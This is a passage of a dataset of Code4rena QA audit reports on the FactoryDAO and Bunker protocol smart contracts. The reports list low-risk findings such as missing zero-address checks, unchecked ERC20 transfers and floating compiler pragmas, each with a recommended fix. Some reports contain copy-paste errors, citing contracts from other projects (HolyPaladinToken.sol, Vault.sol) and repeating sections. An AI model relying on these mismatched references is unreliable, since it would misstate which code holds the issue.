      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/236"
    }
  },
  {
    "title": "QA Report",
    "body": "##LOW\n\n1.\nTitle: No check that `rewardsWeiPerSecondPerToken` != 0\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L105\n\nIn case it allowed to input 0 as `rewardsWeiPerSecondPerToken`, There are no reward user can claim as  [L169](https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L169), and it doesn't incentivise the holders as it was expected in the docs. I recommend to check that there is no 0 value on `rewardsWeiPerSecondPerToken` array\n\nRECOMMENDED MITIGATION STEP\n```\n    function addPool (\n        uint startTime,\n        uint maxDeposit,\n        uint[] memory rewardsWeiPerSecondPerToken,\n        uint programLengthDays,\n        address depositTokenAddress,\n        address excessBeneficiary,\n        address[] memory rewardTokenAddresses,\n        bytes32 ipfsHash,\n        bytes32 name\n    ) external {\n\n\tfor(uint i; i < rewardsWeiPerSecondPerToken.length; ++i){\n\t   require(rewardsWeiPerSecondPerToken[i] != 0);\n\t}\n        Pool storage pool = pools[++numPools];\n        pool.id = numPools;\n        pool.rewardsWeiPerSecondPerToken = rewardsWeiPerSecondPerToken;\n        pool.startTime = startTime > block.timestamp ? startTime : block.timestamp;\n        pool.endTime = pool.startTime + (programLengthDays * 1 days);\n        pool.depositToken = depositTokenAddress;\n        pool.excessBeneficiary = excessBeneficiary;\n        pool.taxPerCapita = globalTaxPerCapita;\n\n```\n\n\n2.\nTitle: Missing check that `programLengthDays` != 0\n\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L107\n\nIf `programLengthDays` == 0, the pool is just gonna be useless because no one can [deposit](https://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L183-L184) \n\n\n3.\nTitle: Using SafeERC20 library for IERC20\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L144\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L198\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L230-L233\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L252\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/PermissionlessBasicPoolFactory.sol#L269\n\nThere are some token which are not implementing current ERC20 standard (example: USDT, OmiseGo and BNB). Using SafeERC20 library will be nice to prevent them stuck when the transaction failed.",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/234"
    }
  },
  {
    "title": "QA Report",
    "body": "# [L-01] Use safeTransfer/safeTransferFrom consistently\n\nA require() statement that checks the return value of token transfers should be used to prevent silent transfer failures with non-compliant ERC20 tokens. Failure to do so can cause silent failures of transfers and affect token accounting in contract, possibly causing loss of value for the user or the protocol.\n\n## Proof of Concept\n\nOne unsafe transfer() exists without return value checks:\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/MerkleVesting.sol#L173\n\n## Recommended Mitigation Steps\n\nUse require statements to check return values consistently or replace transfer/transferFrom with safeTransfer/safeTransferFrom from [Open Zeppelin's SafeERC20 library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol)\n\n# [L-02] `isContract` logic can be bypassed\n\nThe logic in `isContract` can be bypassed. It uses the same approached described in https://solidity-by-example.org/hacks/contract-size\n\n## Proof of Concept\n\nThe logic that can be bypassed is for `isContract`\nhttps://github.com/code-423n4/2022-05-factorydao/blob/main/contracts/VoterID.sol#L343\n\n## Recommended Mitigation Steps\n\nOne solution that works for now is to check `tx.origin == msg.sender`. This is true for EOAs and false for contracts, but this can change with later EIPs.",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/220"
    }
  },
  {
    "title": "QA Report",
    "body": "# 1. Missing zero address checks\n## Risk\nLow\n\n## Impact\nFactoryDAO's contracts do not check for zero addresses which might lead to loss of funds, failed transactions and can break the protocol functionality\n\n## Proof of Concept\n`MerkleDropFactory.sol`:\n* Missing check for `tokenAddress` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L49\n* Missing check for `destination` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L88\n\n`MerkleResistor.sol`:\n* Missing check for `tokenAddress` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L80\n\n`MerkleVesting.sol`:\n* Missing check for `tokenAddress` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleVesting.sol#L62\n\n`MerkleIdentity.sol`:\n* Missing check for `_mgmt` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L52\n* Missing check for `newMgmt` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L60\n* Missing check for `newAdder` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L67\n* Missing checks for `nftAddress`, `priceGateAddress`, `eligibilityAddress` addresses - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L92-L94\n\n`MerkleEligibility.sol`:\n* Missing check `_gateMaster` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleEligibility.sol#L35\n\n\n`FixedPricePassThruGate.sol`:\n* Missing check for `_beneficiary` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/FixedPricePassThruGate.sol#L28\n`SpeedBumpPriceGate.sol`:\n* Missing check `beneficiary` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L37\n\n`VoterID.sol`:\n* Missing check for `ooner` and `minter` addresses - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L108\n* Missing check for `thisOwner` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L122\n* Missing check for `newOwner` address - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L151\n\n\n`PermissionlessBasicPoolFactory.sol`:\n* Missing check for `_globalBeneficiary` address - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L75\n* Missing check for `depositTokenAddress` address - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L97\n* Missing check for `excessBeneficiary` address - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L98\n* Missing check for `rewardTokenAddresses` addresses - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L116\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to add zero address checks for listed parameters.\n\n# 2. Missing events\n## Risk\nLow\n\n## Impact\nMultiple contracts are not implementing events for critical functions. Lack of events makes it difficult for off-chain applications to monitor the protocol.\n\n## Proof of Concept\n`MerkleIdentity.sol`:\n* Missing setManagement event - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L60-L62\n* Missing setTreeAdder event - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L67\n* Missing setIpfsHash event - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L75\n* Missing withdraw event - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L116-L135\n\n`MerkleEligibility.sol`:\n* Missing event for addGate - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleEligibility.sol#L45-L51\n\n`FixedPricePassThruGate.sol`:\n* Missing event for addGate - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/FixedPricePassThruGate.sol#L28-L33\n\n`SpeedBumpPriceGate.sol`:\n* Missing event for addGate - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L37-L45\n\n`PermissionlessBasicPoolFactory.sol`:\n* Missing event for withdrawTaxes - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L261\n* Missing event for setGlobalTax - https://github.com/code-423n4/2022-05-factorydao/blob/e22a562c01c533b8765229387894cc0cb9bed116/contracts/PermissionlessBasicPoolFactory.sol#L314\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to add missing events to listed functions.\n\n# 3. Use SafeERC20 safeTransfer\n## Risk\nLow\n\n## Impact\nThe `IERC20.transfer()` function returns a boolean value indicating success. This parameter needs to be checked for success. Some tokens do not revert if the transfer failed but return false instead.\n\nTokens that don't actually perform the transfer and return false are still counted as a correct transfer. Furthermore, tokens that do not correctly implement the EIP20 standard, like USDT which does not return a success boolean, will revert.\n\n## Proof of Concept\n`MerkleVesting.sol`:\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleVesting.sol#L173\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to use OpenZeppelin's SafeERC20 with the `safeTransfer` function that handles the return value check as well as non-standard-compliant tokens.\n\n# 4. Not following checks-effects-interactions pattern\n## Risk\nLow\n\n## Impact\nFunction `PermissionlessBasicPoolFactory.fundPool` does not follow checks-effects-interactions pattern that might lead to reentrancy attacks.\n\n```\n    success = success && IERC20(pool.rewardTokens[i]).transferFrom(msg.sender, address(this), amount);\n    // bookkeeping to make sure pools don't share tokens\n    pool.rewardFunding[i] += amount;\n```\n\n## Proof of Concept\n`PermissionlessBasicPoolFactory.sol`\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L144-L146\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to first set the effects and then perform interactions such as external calls.\n\n# 5. Owner - critical address change\n## Impact\nChanging critical addresses such as ownership should be a two-step process where the first transaction (from the old/current address) registers the new address (i.e. grants ownership) and the second transaction (from the new address) replaces the old address with the new one. This gives an opportunity to recover from incorrect addresses mistakenly used in the first step. If not, contract functionality might become inaccessible.\n\n## Proof of Concept\n`MerkleIdentity.sol`:\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L60-L62\n\n`VoterID.sol`:\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L151-L155\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to implement two-step process for passing ownership for HolyPaladinToken.sol and PaladinRewardReserve.sol contracts.\n\n# 6. Missing validation\n## Risk\nLow\n\n## Impact\nMissing check for `_globalTaxPerCapita` that should not exceeds `1000`.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L75-L78\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to add check for `_globalTaxPerCapita` to make sure that the value cannot be bigger than `1000`.\n\n# 7. VoterID tokenURI does not revert for non existent tokens\n## Risk\nNon-Critical\n\n## Impact\nFunction `VoterID.tokenURI` that implements ERC721 standard should revert in case of non existent tokens.\n\n## Proof of Concept\n* https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L411-L413\n\n## Tools Used\nManual Review / VSCode\n\n## Recommended Mitigation Steps\nIt is recommended to revert for non existent tokens.\n\n# 8. Contracts use different compiler versions\n## Risk\nNon-Critical\n\n## Impact\nUsing different compiler versions across contracts of the same project might lead to confusion and accidental errors.\n\n## Proof of Concept\nExamples:\n* `0.8.12` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/PermissionlessBasicPoolFactory.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/FixedPricePassThruGate.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/SpeedBumpPriceGate.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleIdentity.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleEligibility.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/VoterID.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleDropFactory.sol#L3\n* `0.8.9` - https://github.com/code-423n4/2022-05-factorydao/blob/db415804c06143d8af6880bc4cda7222e5463c0e/contracts/MerkleResistor.sol#L3\n\n## Tools Used\nManual Review / VS Code\n\n## Recommended Mitigation Steps\nConsider using a single compiler version for compiling both contracts, for example 0.8.12.",
    "dataSource": {
      "name": "code-423n4/2022-05-factorydao-findings",
      "repo": "https://github.com/code-423n4/2022-05-factorydao-findings",
      "url": "https://github.com/code-423n4/2022-05-factorydao-findings/issues/216"
    }
  },
  {
    "title": "QA Report",
    "body": "\n## Require with empty message\n\nThe following requires are with empty messages. \nThis is very important to add a message for any require. So the user has enough information to know the reason of failure.\n### Code instance:\n\n        Solidity file: CEther.sol, In line 148 with Empty Require message.\n\n\n\n## Not verified input\n\n\nexternal / public functions parameters should be validated to make sure the address is not 0.\nOtherwise if not given the right input it can mistakenly lead to loss of user funds.    \n\n### Code instances:\n\n        CEther.sol.liquidateBorrowNft borrower\n        CNft.sol.call to\n        CNft.sol.safeBatchTransferFrom to\n        Comptroller.sol.seizeAllowed liquidator\n        Comptroller.sol.transferAllowed cAsset\n\n\n\n## Solidity compiler versions mismatch\n\n\nThe project is compiled with different versions of solidity, which is not recommended because it can lead to undefined behaviors.\n        \n### Code instance:\n\n        \n\n\n\n## Use safe math for solidity version <8\n\nYou should use safe math for solidity version <8 since there is no default over/under flow check it suchversions of solidity.\n### Code instances:\n\n        The contract CEther.sol doesn't use safe math and is of solidity version < 8\n        The contract Comptroller.sol doesn't use safe math and is of solidity version < 8\n        The contract CErc20.sol doesn't use safe math and is of solidity version < 8\n\n\n\n## Init frontrun\n\nMost contracts use an init pattern (instead of a constructor) to initialize contract parameters. Unless these are enforced to be atomic with contact deployment via deployment script or factory contracts, they are susceptible to front-running race conditions where an attacker/griefer can front-run (cannot access control because admin roles are not initialized) to initially with their own (malicious) parameters upon detecting (if an event is emitted) which the contract deployer has to redeploy wasting gas and risking other transactions from interacting with the attacker-initialized contract.\n\nMany init functions do not have an explicit event emission which makes monitoring such scenarios harder. All of them have re-init checks; while many are explicit some (those in auction contracts) have implicit reinit checks in initAccessControls() which is better if converted to an explicit check in the main init function itself.\n(details credit to: https://github.com/code-423n4/2021-09-sushimiso-findings/issues/64)\nThe vulnerable initialization functions in the codebase are: \n\n### Code instance:\n\n        CNft.sol, initialize, 17\n\n\n\n## Assert instead require to validate user inputs\n\n\n        From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.\n        With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.\n        \n### Code instances:\n\n        Comptroller.sol : reachable assert in line 332\n        Comptroller.sol : reachable assert in line 206\n\n\n\n## In the following public update functions no value is returned\n\nIn the following functions no value is returned, due to which by default value of return will be 0. \nWe assumed that after the update you return the latest new value. \n(similar issue here: https://github.com/code-423n4/2021-10-badgerdao-findings/issues/85). \n\n### Code instance:\n\n        Comptroller.sol, updateContributorRewards\n\n\n\n## Never used parameters\n\nThose are functions and parameters pairs that the function doesn't use the parameter. In case those functions are external/public this is even worst since the user is required to put value that never used and can misslead him and waste its time. \n\n### Code instances:\n\n        CNft.sol: function onERC721Received parameter tokenId isn't used. (onERC721Received is public)\n        CNft.sol: function onERC1155Received parameter data isn't used. (onERC1155Received is public)\n        CNft.sol: function onERC1155Received parameter from isn't used. (onERC1155Received is public)\n        Comptroller.sol: function _initializeNftCollateral parameter _collateralFactorMantissa isn't used. (_initializeNftCollateral is external)\n        CNft.sol: function onERC1155Received parameter value isn't used. (onERC1155Received is public)\n\n\n\n## Check transfer receiver is not 0 to avoid burned money\n\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\n\n### Code instances:\n\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L139\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CEther.sol#L167\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L95\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CErc20.sol#L209\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CErc20.sol#L174\n\n\n\n## Assert instead require to validate user inputs\n\n\n        From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix.\n        With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.\n        \n### Code instances:\n\n        Comptroller.sol : reachable assert in line 332\n        Comptroller.sol : reachable assert in line 206\n\n\n\n## In the following public update functions no value is returned\n\nIn the following functions no value is returned, due to which by default value of return will be 0. \nWe assumed that after the update you return the latest new value. \n(similar issue here: https://github.com/code-423n4/2021-10-badgerdao-findings/issues/85). \n\n### Code instance:\n\n        Comptroller.sol, updateContributorRewards\n\n\n\n## Never used parameters\n\nThose are functions and parameters pairs that the function doesn't use the parameter. In case those functions are external/public this is even worst since the user is required to put value that never used and can misslead him and waste its time. \n\n### Code instances:\n\n        CNft.sol: function onERC721Received parameter tokenId isn't used. (onERC721Received is public)\n        CNft.sol: function onERC1155Received parameter data isn't used. (onERC1155Received is public)\n        CNft.sol: function onERC1155Received parameter from isn't used. (onERC1155Received is public)\n        Comptroller.sol: function _initializeNftCollateral parameter _collateralFactorMantissa isn't used. (_initializeNftCollateral is external)\n        CNft.sol: function onERC1155Received parameter value isn't used. (onERC1155Received is public)\n\n\n\n## Two arrays length mismatch\n\n\nThe functions below fail to perform input validation on arrays to verify the lengths match.\nA mismatch could lead to an exception or undefined behavior.\nConsider making this a medium risk please.\n    \n    \n### Code instances\n\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/ERC1155Enumerable.sol#L35 _beforeTokenTransfer ['ids', 'amounts']\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L166 safeBatchTransferFrom ['ids', 'amounts']\n\n\n\n## Not owner function calls an owner function\n\n\n    \n### Code instance:\n\n        CNft.sol.executeCall - calls call\n\n\n\n## Div by 0\n\n\nDivision by 0 can lead to accidentally revert,\n(An example of a similar issue - https://github.com/code-423n4/2021-10-defiprotocol-findings/issues/84)\n\n### Code instances:\n\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L40 amounts might be 0\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L116 amounts might be 0\n\n\n\n## Tokens with fee on transfer are not supported\n\n\nThere are ERC20 tokens that charge fee for every transfer() / transferFrom().\n\nVault.sol#addValue() assumes that the received amount is the same as the transfer amount, \nand uses it to calculate attributions, balance amounts, etc. \nBut, the actual transferred amount can be lower for those tokens.\nTherefore it's recommended to use the balance change before and after the transfer instead of the amount.\nThis way you also support the tokens with transfer fee - that are popular.\n\n\n### Code instances:\n\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L95\n        https://github.com/code-423n4/bunker-protocol/tree/main/contracts/CNft.sol#L139\n\n\n\n## transfer return value of a general ERC20 is ignored\n\nNeed to use safeTransfer instead of transfer. As there are popular tokens, such as USDT that transfer/trasnferFrom method doesn’t return anything. The transfer return value has to be checked (as there are some other tokens that returns false instead revert), that means you must \n 1. Check the transfer return value\nAnother popular possibility is to add a whiteList.\nThose are the appearances (solidity file, line number, actual line):\n\n### Code instances:\n\n        CErc20.sol, 209 (doTransferOut), token.transfer(to, amount);\n        CErc20.sol, 174 (doTransferIn), token.transferFrom(from, address(this), amount);\n        CErc20.sol, 138 (sweepToken), token.transfer(admin, balance);\n",
    "dataSource": {
      "name": "code-423n4/2022-05-bunker-findings",
      "repo": "https://github.com/code-423n4/2022-05-bunker-findings",
      "url": "https://github.com/code-423n4/2022-05-bunker-findings/issues/103"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n### 1. Use Two-Step Transfer Pattern for Access Controls\n#### Impact\nContracts implementing access control's, e.g. `owner`, should consider implementing a Two-Step Transfer pattern. Otherwise it's possible that the role mistakenly transfers ownership to the wrong address, resulting in a loss of the role\n#### Proof of Concept\n[`Comptroller.sol::_changeAdmin()`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L731-L734)\n```solidity=731\n    function _changeAdmin(address newAdmin) external {  // @audit low: address(0) check\n        require(msg.sender == admin, \"Only admin can change the admin\");  \n        admin = newAdmin;\n    }\n```\n#### Recommendation\nConsider adding a `pendingOwner` where the new owner will have to accept the ownership. This two-step process is already implemented in `CToken.sol`.\n\n**Example from [`CToken.sol`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L1200-L1249)**\n```solidity=1200\n    /**\n      * @notice Begins transfer of admin rights. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @dev Admin function to begin change of admin. The newPendingAdmin must call `_acceptAdmin` to finalize the transfer.\n      * @param newPendingAdmin New pending admin.\n      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n      */\n    function _setPendingAdmin(address payable newPendingAdmin) external returns (uint) {\n        // Check caller = admin\n        if (msg.sender != admin) {\n            return fail(Error.UNAUTHORIZED, FailureInfo.SET_PENDING_ADMIN_OWNER_CHECK);\n        }\n\n\n        // Save current value, if any, for inclusion in log\n        address oldPendingAdmin = pendingAdmin;\n\n\n        // Store pendingAdmin with value newPendingAdmin\n        pendingAdmin = newPendingAdmin;\n\n\n        // Emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin)\n        emit NewPendingAdmin(oldPendingAdmin, newPendingAdmin);\n\n\n        return uint(Error.NO_ERROR);\n    }\n\n\n    /**\n      * @notice Accepts transfer of admin rights. msg.sender must be pendingAdmin\n      * @dev Admin function for pending admin to accept role and update admin\n      * @return uint 0=success, otherwise a failure (see ErrorReporter.sol for details)\n      */\n    function _acceptAdmin() external returns (uint) {\n        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)\n        if (msg.sender != pendingAdmin || msg.sender == address(0)) {\n            return fail(Error.UNAUTHORIZED, FailureInfo.ACCEPT_ADMIN_PENDING_ADMIN_CHECK);\n        }\n\n\n        // Save current values for inclusion in log\n        address oldAdmin = admin;\n        address oldPendingAdmin = pendingAdmin;\n\n\n        // Store admin with value pendingAdmin\n        admin = pendingAdmin;\n\n\n        // Clear the pending value\n        pendingAdmin = address(0);\n\n\n        emit NewAdmin(oldAdmin, admin);\n        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);\n\n\n        return uint(Error.NO_ERROR);\n    }\n```\n### 2. Unspecific Compiler Version Pragma\n#### Impact\nA known vulnerable compiler version may accidentally be selected or security tools might fall-back to an older compiler version ending up checking a different EVM compilation that is ultimately deployed on the blockchain.\n#### Proof of Concept\n```solidity\n  CErc20.sol::1 => pragma solidity ^0.5.16;\n  CEther.sol::1 => pragma solidity ^0.5.16;\n  CNft.sol::2 => pragma solidity ^0.8.0;\n  CNftPriceOracle.sol::2 => pragma solidity ^0.8.0;\n  CToken.sol::1 => pragma solidity ^0.5.16;\n  Comptroller.sol::1 => pragma solidity ^0.5.16;\n  ERC1155Enumerable.sol::2 => pragma solidity ^0.8.0;\n  PriceOracleImplementation.sol::1 => pragma solidity ^0.5.16;\n  UniswapV2PriceOracle.sol::2 => pragma solidity ^0.8.0;\n```\n#### Recommendation\nAvoid floating pragmas for non-library contracts. It is recommended to pin to a concrete compiler version.\n\n### 3. Unsafe ERC20 Operations\n#### Impact\nThe return value of an external transfer/transferFrom call is not checked\n#### Proof of Concept\n```solidity\n  CErc20.sol::138 => token.transfer(admin, balance);\n  CErc20.sol::174 => token.transferFrom(from, address(this), amount);\n  CErc20.sol::209 => token.transfer(to, amount);\n  CEther.sol::167 => to.transfer(amount);\n  Comptroller.sol::1256 => comp.transfer(user, amount);\n```\n#### Recommendation\nUse `SafeERC20`, or ensure that the `transfer`/`transferFrom` return value is checked.\n\n### 4. Missing checks for `address(0)` when assigning values to address state variables.\n#### Impact\nSetters of address type parameters should include a zero-address check otherwise contract functionality may become inaccessible or tokens burnt forever.\n#### Proof of Concept\n[`Comptroller.sol::_changeAdmin()`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L731-L734), [`Comptroller.sol::_setBorrowCapGuardian()`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L959), [`Comptroller.sol::_setPauseGuardian()`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L977).\n#### Recommendation\nAdd `address(0)` checks.\n\n### 5. Invalid documentation regardin upper-bounds error checks.\n#### Impact\nAcross the contracts, there are several areas which refer to the constant value -1 in documentation, but, in fact, refers to `uint(-1)`, which is just the maximum value of a `uint` (2^256 - 1). This could result in improper assumptions about functionality and lead to misunderstanding\ndeveloper intent.\n#### Proof of Concept\n```solidity=968\n/* Fail if repayAmount = -1 */\nif (repayAmount == uint(-1)) {\n    return (fail(Error.INVALID_CLOSE_AMOUNT_REQUESTED, FailureInfo.LIQUIDATE_CLOSE_AMOUNT_IS_UINT_MAX), 0);\n}\n```\n#### Recommendation\nEnsure documentation is correct to avoid potential confusion.\n\n### 6. Incorrect use of \"infinite\" in documentation.\nIncorrect usage of the word \"infinite\". `uint(-1)` does not mean infinite, like it says in the comments, but it just means `2^256 - 1`.\n#### Proof of Concept\n[`CToken.sol#L80`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L80),[`CToken.sol#L153`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L153), [`CToken.sol#L167`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L167).\n\nCheck `@audit` tags.\n```solidity=80\n/* Get the allowance, infinite for the account owner */ // @audit technically not infinite. its 2^256 - 1.\nuint startingAllowance = 0;\nif (spender == src) {\n    startingAllowance = uint(-1); // @audit uint(-1) = 2^256 - 1\n```\n```solidity=153\n * @param amount The number of tokens that are approved (-1 means infinite) // @audit not infinite, uint(-1) = 2^256 - 1.\n```\n```solidity=167\n * @return The number of tokens allowed to be spent (-1 means infinite) // @audit not infinite, uint(-1) = 2^256 - 1.\n```\n#### Recommendation\nFix comments.\n\n\n## Non-Critical\n### 1. Natspec is incomplete\nMissing `@return`: [`Comptroller.sol#L395-L402`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L395-L402), [`Comptroller.sol#L442-L448`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/Comptroller.sol#L442-L448), [`CToken.sol#L221-L224`](https://github.com/bunkerfinance/bunker-protocol/blob/752126094691e7457d08fc62a6a5006df59bd2fe/contracts/CToken.sol#L221-L224), 